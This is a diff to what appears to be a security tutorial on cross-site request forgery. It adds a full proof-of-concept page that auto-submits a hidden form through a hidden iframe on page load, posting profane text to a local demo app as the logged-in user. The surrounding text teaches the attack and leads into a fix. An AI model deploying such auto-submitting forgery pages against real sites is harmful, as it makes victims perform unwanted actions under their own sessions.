@@ -171,7 +171,35 @@ The malicious page (i.e. csrf.html) has a hidden form inside of it that will be 
 
 Because you are currently authenticated by a cookie saved in your browser, the malicious page may send an HTTP request on your behalf to the site -which trusts you- and thereby causes an unwanted action Without your intention. Here the side effects may be posting text contains profanity which leads to ban you from the site. 
 
-It is also worth to mention that the malicious page could be implemented to be more tricky that you doesn't need to click on anything and the request will be sent as soon as you just open the page.
+It is also worth to mention that the malicious page could be implemented to be more tricky that you doesn't need to click on anything and the request will be sent as soon as you just open (i.e. load) the page.. here is an example:
+
+`<!DOCTYPE html>`
+
+`<html>`
+
+`  <head>`
+
+`    <title>Win Money!</title>`
+
+`  </head>`
+
+`  <body onload="document.csrfForm.submit()">`
+
+`    <p>wasted!</p>`
+
+`    <form action="http://localhost:8080/quotes" method="POST" target="hiddenFrame" name="csrfForm">`
+
+`      <input type="hidden" name="id" value="97"/>`
+
+`      <input type="hidden" name="content" value="Another Inappropriate text that contains Profanity"/>`
+
+`    </form>`
+
+`    <iframe name="hiddenFrame" style="display: none;"></iframe>`
+
+`  </body>`
+
+`</html>`
 
 ### _how to fix it:_
 
